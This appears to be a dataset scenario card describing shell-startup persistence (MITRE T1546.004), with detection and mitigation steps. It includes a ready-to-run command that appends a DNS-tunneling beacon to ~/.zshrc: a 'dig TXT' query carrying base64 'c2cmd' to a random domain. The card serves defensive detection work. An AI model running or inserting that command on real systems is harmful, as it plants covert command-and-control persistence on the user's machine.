---
type: campaign
scenario_id: 438
tactic: Persistence
technique: "T1546.004: Unix Shell Configuration Modification"
technique_id: T1546.004
tags: [campaign, lotl, persistence]
---

# Adding DNS tunneling script to zshrc for persistence.

## Threat Description
Adding DNS tunneling script to zshrc for persistence.

## Attack Command
```
echo "dig +short TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) > /dev/null" >> ~/.zshrc
```

## Detection Logic
Monitor zshrc changes: `cat ~/.zshrc | grep dig | grep TXT`; Audit file changes: `auditctl -w ~/.zshrc -p wa`.

## Mitigation
Restrict zshrc writes: `chmod 600 ~/.zshrc`; Monitor shell configuration changes.

## AI Training Prompt
Train AI to detect DNS tunneling persistence in zshrc by analyzing dig TXT commands, base64-encoded subdomains, and file modifications; suggest file protections.

## References
- MITRE ATT&CK T1546.004: https://attack.mitre.org/techniques/T1546/004/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
